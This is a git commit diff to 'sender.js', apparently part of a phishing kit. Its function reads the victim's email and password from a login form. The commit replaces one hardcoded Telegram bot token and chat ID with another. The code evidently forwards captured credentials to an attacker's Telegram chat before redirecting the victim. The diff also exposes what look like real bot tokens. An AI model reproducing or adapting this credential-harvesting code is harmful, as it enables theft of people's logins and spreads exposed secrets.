51ff38e81456619be8c057ca218ac219a0656487
bellusa <willsdavid01@proton.me>
2025-02-26 04:44:46 -0800

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
-  const chatId = 5710607863; // Replace with your chat ID
+  const telegramBotToken = "6567283982:AAEnrAsI1zzaLrGFULyuw-FArp4XMwJbNak"; // Replace with your Telegram bot token
+  const chatId = 6629907685; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
